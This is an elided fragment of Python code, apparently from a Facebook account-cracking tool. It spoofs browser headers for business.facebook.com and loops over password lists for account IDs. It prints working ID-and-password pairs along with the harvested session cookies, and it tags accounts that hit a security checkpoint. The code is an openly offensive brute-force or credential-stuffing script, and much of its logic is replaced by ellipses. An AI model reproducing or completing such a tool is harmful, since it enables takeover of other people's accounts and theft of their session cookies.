...
api = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_0; like Mac OS X) AppleWebKit/603.40 (KHTML, like Gecko)  Chrome/54.0.3369.203 Mobile Safari/533.5","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-PK;q=0.6,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
...
def ffb(ids, names, passlist):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if "c_user" in Aking:
                print("")
                print(f'\r\033[0;92m[DARK-Ok💚] {ids} • {pas}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{cookies}')
                for k,v in session.cookies.items():
                    cookies = str(k) + "=" + str(v) + ";"
                print('\r\r\033[1;32m %s' % cookies)
                os.system('espeak -a 300 " DARK, Z,  Ok,  id"')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                ...
                if 'y' in pcp:
                    print(f'\r\033[0;94m[DARK-Cp] {ids} • {pas}')
